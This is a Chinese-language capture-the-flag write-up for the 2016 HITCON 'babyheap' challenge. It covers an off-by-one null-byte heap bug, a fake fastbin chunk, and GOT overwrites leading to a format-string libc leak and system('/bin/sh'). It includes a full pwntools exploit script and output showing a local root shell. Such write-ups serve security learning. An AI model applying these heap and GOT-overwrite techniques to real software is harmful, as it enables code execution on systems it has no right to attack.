---
title: 2016 HITCON CTF babyheap
date: 2017-04-11 04:29:13
tags:
- ctf
- off-by-one
- got_overwrite
categories:
- ctf_practice
---

## Vulnerability
首先基本逆向一下，得到一个结构体：
```c
struct note
{
	int size;
	char name[8];
 	char *content;
}
```
<!-- more -->
这题跟上次做的car-market有点相似之处，在读入name时存在off-by-one null byte的漏洞，可以把content指针的最低字节覆盖为\x00。只不过这题限制有点多，edit，delete只能操作一次，new能操作两次。
```shell
gdb-peda$ x/32gx 0x00603000
0x603000:	0x0000000000000000	0x0000000000000021
0x603010:	0x0000000000000010	0x0a62626262626262
0x603020:	0x0000000000603000	0x0000000000000021
0x603030:	0x0000000a61616161	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000020fc1
0x603050:	0x0000000000000000	0x0000000000000000
```
如果没有提醒的话根本就不知道从哪入手，可能会在ubuntu14.04上运行这个程序，到最后看不出一点端倪。
```shell
Hint
We are STRONGLY recommend that you try this challenge in 16.04 (or with the attached libc)
```
问题就在选项4的exit中，当调用\__isoc99_scanf("%2s", &v4)时，在Ubuntu16.04中会分配0x410大小(随输入内容变化)的堆块(在常规heap区域，不在mapped区域，Ubuntu14.04会在mapped区域)来存储输入字符。
```shell
gdb-peda$ x/32gx 0x603010
0x603010:	0x6161616161616e6e	0x000000000000000a
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
......
```
这时候我们调用一次new，且触发off-by-one漏洞。然后delete的话glibc会把位于0x6033f0的chunk加入fastbin(我们可以伪造合适大小到可以覆盖content指针)。然后再new一次，0x603410的chunk会分配给note，然后我们指定size大小为0x50，这是glibc会把0x6033f处的chunk分配来储存content内容。然后我们可以覆盖content指针，最后edit来达到任意地址写。
```shell
gdb-peda$ x/32gx 0x00603400-0x10
0x6033f0:	0x0000000000000000	0x0000000000000061
0x603400:	0x0000000000000000	0x0000000000000000
0x603410:	0x0000000000000000	0x0000000000000021
0x603420:	0x0000000000000010	0x0a62626262626262
0x603430:	0x0000000000603400	0x0000000000000021
0x603440:	0x000a616161616161	0x0000000000000000
0x603450:	0x0000000000000000	0x0000000000020bb1
0x603460:	0x0000000000000000	0x0000000000000000
```
可问题是edit函数只能调用一次~！可以overwrite got表的内容。把那啥_exit的got表地址改为alarm@plt，这样edit就可以调用多次了。

## Exploit
重写got表的目的是泄露libc地址和替换某些函数的got表地址为system的地址，怎么用就得靠自己经验了。我结合自己的理解把利用思路梳理了一下。

### Steps
1. exit，在堆尾伪造size字段；
2. new，触发off-by-one覆盖content指针最后一字节为\x00；
3. delete，把fake chunk加入fastbin；
4. new，取回fake chunk，把content指针覆盖为_exit@got的地址；
5. edit，rewrite got表内容。这时候需要注意的是，有的函数got表内容不能改，否则会影响程序运行。首先_exit@got改为alarm@plt，然后把atoi@got改为printf@plt，这样下次在输入的时候我们可以通过格式化字符串漏洞泄露libc的地址。
6. edit，然后把atoi@got覆盖为system的地址，最后发送'sh'即可。这一步需要特别注意的一点是，因为atoi@got被修改为printf@plt，所以当你发送'3\n'时，实际上是选中了选项'2'从而调用delete——因为printf("3\n")的返回值是2。所以这时你应该发送'3 \n'，只要让printf的返回值是3即可。

### Script
```python
from pwn import *

debug = 1
if debug:
	#context.log_level = "debug"
	p = process('./babyheap')
else:
	pass

def new(size, content, name):
	p.recvuntil("Your choice:")
	p.sendline("1")
	p.recvuntil("Size :")
	p.sendline(str(size))
	p.recvuntil("Content:")
	p.send(content)
	p.recvuntil("Name:")
	p.send(name)

def edit(content):
	p.recvuntil("Your choice:")
	p.sendline("3")
	p.recvuntil("Content:")
	p.send(content)

def delete():
	p.recvuntil("Your choice:")
	p.sendline("2")

def exit(content):
	p.recvuntil("Your choice:")
	p.sendline("4")
	p.recvuntil("Really? (Y/n)")
	p.sendline(content)

exit_got = 0x602020
alarm_plt = 0x400790
free_got = 0x602018
printf_plt = 0x400780
atoi_got = 0x602078
read_chk_plt = 0x400750
puts_plt = 0x400760
read_plt = 0x4007A0

free_off = 0x83940
system_off = 0x45390

payload1 = 'nn' + "\x00" * (0x1000 - 0x18 - 2) + p64(0x61)
exit(payload1)
#raw_input("go")
content1 = 'a' * 16
name1 = 'b' * 8
new(16, content1, name1)
delete()

got_payload  = p64(alarm_plt)             # _exit
got_payload += p64(read_chk_plt + 6)     # __read_chk
got_payload += p64(puts_plt + 6)         # puts
got_payload += p64(0xdeadbeef)
got_payload += p64(printf_plt + 6)   # printf
got_payload += p64(alarm_plt + 6)    # alarm
got_payload += p64(read_plt + 6)     # read
got_payload += p64(0xdeadbeef)
got_payload += p64(0xdeadbeef)
got_payload += p64(0xdeadbeef)
got_payload += p64(0xdeadbeef)
got_payload += p64(printf_plt)     # atoi

content2 = "\x00" * 0x20 
content2 += p64(len(got_payload))  #size
content2 += p64(0)                #name
content2 += p64(exit_got)       #content

new(0x50, content2, 'aaaa')
#raw_input("go")

edit(got_payload)
#raw_input("go")

p.recvuntil("Your choice:")
p.send("%9$saaaa" + p64(free_got))

free_addr = u64(p.recv(6).ljust(8, "\x00"))
libc_addr = free_addr - free_off
system_addr = libc_addr + system_off

print "free_addr: " + hex(free_addr)
print "system_addr: " + hex(system_addr)

got_payload = got_payload[:-8]
got_payload += p64(system_addr)
raw_input("go")

p.recvuntil("Your choice:")
p.send("333")
p.recvline()
p.send(got_payload)

p.recvuntil("Your choice:")
p.sendline('/bin/sh')
p.interactive()
```
最终我们可以得到一个shell。
```shell
root@w0lfzhang666:/home/w0lfzhang/Desktop# python babyheap.py 
[+] Starting local process './babyheap': pid 42608
free_addr: 0x7fbd9f1ba940
system_addr: 0x7fbd9f17c390
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$  
```

## Reference
[Shift Crops](http://shift-crops.hatenablog.com/entry/2016/10/11/233559#Babyheap-Pwn-300)
